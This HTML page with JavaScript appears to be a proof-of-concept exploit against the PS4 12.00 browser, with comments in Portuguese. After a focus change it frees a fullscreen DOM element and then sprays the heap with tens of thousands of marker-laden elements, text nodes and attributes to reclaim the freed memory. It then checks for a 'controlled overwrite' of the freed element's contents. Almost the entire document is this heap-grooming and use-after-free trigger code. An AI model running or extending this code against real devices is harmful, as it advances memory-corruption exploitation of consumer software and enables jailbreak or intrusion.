<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Aggressive Reclaim (Controlled Overwrite)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Aggressive Reclaim - Controlled Overwrite</h2>
<button onclick="runTest()">Run Test</button>

<script>

let logBuffer = [];

function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN
// ==========================
function setupFullscreen(){
    let fs=document.createElement("div");

    fs.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fs.style.cssText="background:black;width:100%;height:100%;position:absolute;top:0;left:0;";

    document.body.appendChild(fs);

    fs.webkitRequestFullscreen?.();

    return fs;
}

// ==========================
// 💣 AGGRESSIVE RECLAIM (REFINADO)
// ==========================
function aggressiveReclaim(){

    log("[*] Aggressive reclaim iniciado");

    let bucket=[];

    // churn
    for(let i=0;i<8000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    // 🔥 CONTROL STRING SPRAY
    for(let i=0;i<10000;i++){
        let e=document.createElement("div");

        // marcador forte
        e.innerHTML="CTRL_"+i+"_41414141_42424242_43434343";

        document.body.appendChild(e);
        bucket.push(e);
    }

    // TEXT spray
    for(let i=0;i<10000;i++){
        let t=document.createTextNode("TXT_"+i+"_BBBBBBBBBBBBBBBB");
        document.body.appendChild(t);
        bucket.push(t);
    }

    // ATTRIBUTE spray
    for(let i=0;i<10000;i++){
        let e=document.createElement("div");
        e.setAttribute("data-x","ATTR_"+i+"_CCCCCCCC");
        document.body.appendChild(e);
        bucket.push(e);
    }

    log("[*] Aggressive reclaim finalizado: "+bucket.length);

    return bucket;
}

// ==========================
// 🔬 CHECK REAL
// ==========================
function checkUAF(fs){

    log("---- UAF CHECK ----");

    try{
        let v=fs.innerHTML;

        log("[CHECK] innerHTML = "+v);

        if(v &&
           (v.includes("4141") ||
            v.includes("4242") ||
            v.includes("4343"))){

            log("[!!!] OVERWRITE CONTROLADO DETECTADO");
        }

        if(v && v.length <= 2){
            log("[!!!] STRING CORROMPIDA (CURTA)");
        }

    }catch(e){
        log("[UAF] innerHTML crash");
    }

    try{
        log("[CHECK] parent = "+fs.parentNode);
    }catch(e){}

    try{
        log("[CHECK] layout = "+fs.offsetTop);
    }catch(e){}

    try{
        fs.innerHTML="A";
        log("[CHECK] write OK");
    }catch(e){
        log("[UAF] write crash");
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fs){

    log("[*] Trigger");

    try{
        fs.remove();

        if(document.webkitIsFullScreen){
            document.webkitExitFullscreen?.();
        }

    }catch(e){}

    setTimeout(()=>aggressiveReclaim(),0);
    setTimeout(()=>aggressiveReclaim(),50);
    setTimeout(()=>aggressiveReclaim(),100);

    setTimeout(()=>checkUAF(fs),100);
    setTimeout(()=>checkUAF(fs),200);
    setTimeout(()=>checkUAF(fs),300);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),500);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Iniciando teste");

    setupHeap();

    let fs=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");

        setTimeout(()=>trigger(fs),3000);
    };
}

</script>

</body>
</html>
